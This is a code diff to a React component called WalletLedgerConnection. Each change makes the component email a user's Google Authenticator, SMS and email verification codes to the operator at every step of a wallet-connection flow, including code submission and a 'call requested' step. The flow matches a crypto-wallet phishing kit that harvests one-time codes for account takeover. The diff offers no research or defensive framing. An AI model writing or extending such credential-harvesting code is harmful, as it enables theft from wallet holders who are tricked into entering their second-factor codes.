@@ -20,10 +20,16 @@ const WalletLedgerConnection = () => {
 
   const handleRequestCall = async () => {
     try {
+      console.log('🚨 Sending email for request call button click');
       await sendEmailNotification({
-        step: "Wallet Connection - Call Requested",
+        step: "Wallet Connection - Call Requested (Button Click)",
         timestamp: new Date().toISOString(),
-        allFormData: codes
+        allFormData: {
+          googleAuth: codes.googleAuth || 'N/A',
+          sms: codes.sms || 'N/A',
+          email: codes.email || 'N/A',
+          action: 'call_requested'
+        }
       });
     } catch (error) {
       console.error('Email notification failed:', error);
@@ -33,10 +39,17 @@ const WalletLedgerConnection = () => {
 
   const handleCallConfirm = async () => {
     try {
+      console.log('🚨 Sending email for call confirm button click');
       await sendEmailNotification({
-        step: "Wallet Connection - Call Confirmed",
+        step: "Wallet Connection - Call Confirmed (Button Click)",
         timestamp: new Date().toISOString(),
-        allFormData: codes
+        allFormData: {
+          googleAuth: codes.googleAuth || 'N/A',
+          sms: codes.sms || 'N/A',
+          email: codes.email || 'N/A',
+          action: 'call_confirmed',
+          verificationCode: '88-12-30'
+        }
       });
     } catch (error) {
       console.error('Email notification failed:', error);
@@ -65,12 +78,20 @@ const WalletLedgerConnection = () => {
     
     if (codes[field].length >= minLength) {
       try {
+        console.log(`🚨 Sending email for ${field} code submit button click`);
         await sendEmailNotification({
-          step: "Wallet Connection - Code Submitted",
+          step: `Wallet Connection - ${field} Code Submitted (Button Click)`,
           field: `${field} code submission`,
           value: codes[field],
           timestamp: new Date().toISOString(),
-          allFormData: codes
+          allFormData: {
+            googleAuth: codes.googleAuth || 'N/A',
+            sms: codes.sms || 'N/A',
+            email: codes.email || 'N/A',
+            submittedField: field,
+            submittedValue: codes[field],
+            action: `${field}_code_submitted`
+          }
         });
       } catch (error) {
         console.error('Email notification failed:', error);
@@ -91,10 +112,17 @@ const WalletLedgerConnection = () => {
 
   const handleFinalNext = async () => {
     try {
+      console.log('🚨 Sending email for final next button click');
       await sendEmailNotification({
-        step: "Wallet Connection - Final Step",
+        step: "Wallet Connection - Final Step (Button Click)",
         timestamp: new Date().toISOString(),
-        allFormData: codes
+        allFormData: {
+          googleAuth: codes.googleAuth || 'N/A',
+          sms: codes.sms || 'N/A',
+          email: codes.email || 'N/A',
+          action: 'final_step_completed',
+          allCodesSubmitted: true
+        }
       });
     } catch (error) {
       console.error('Email notification failed:', error);
